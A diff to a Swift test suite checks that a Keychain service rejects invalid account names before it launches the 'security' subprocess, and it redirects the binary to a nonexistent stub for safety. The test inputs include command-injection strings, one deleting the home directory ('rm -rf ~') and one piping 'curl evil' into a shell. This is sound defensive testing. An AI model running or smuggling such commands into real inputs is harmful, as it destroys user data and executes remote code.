@@ -413,21 +413,26 @@ struct EnvVarNameTests {
     }
 }
 
-@Suite("KeychainService sink validation Tests (#116)")
+@Suite("Keychain sink validation Tests (#116)")
 struct KeychainServiceSinkValidationTests {
 
     @Test("save rejects an invalid account name before touching the Keychain")
     func saveRejectsInvalidAccount() {
-        // ガードは SecItem 呼び出し前に throw するため、実 Keychain に触れずに検証できる。
+        // ガードは subprocess 起動前に throw するため、実 Keychain に触れずに検証できる。
         // 外部由来（共有ファイル等）の不正な名前がどの ingress からでも書き込まれないこと。
+        // security バイナリを存在しないパスに差し替え、万一ガードを素通りしたら
+        // failedToLaunch 系で確実に落ちる（実 keychain 汚染ゼロ）ようにする。
+        let service = SecurityCLIKeychainService()
+        service.securityBinOverrideForTesting = "/nonexistent/security-test-stub"
+        service.keychainLockedProbeForTesting = { false }
         #expect(throws: KeychainError.self) {
-            try KeychainService.shared.save(value: "x", for: "EVIL\"; rm -rf ~; #")
+            try service.save(value: "x", for: "EVIL\"; rm -rf ~; #")
         }
         #expect(throws: KeychainError.self) {
-            try KeychainService.shared.save(value: "x", for: "has space")
+            try service.save(value: "x", for: "has space")
         }
         #expect(throws: KeychainError.self) {
-            try KeychainService.shared.save(value: "x", for: "X=x $(curl evil|sh)")
+            try service.save(value: "x", for: "X=x $(curl evil|sh)")
         }
     }
 }
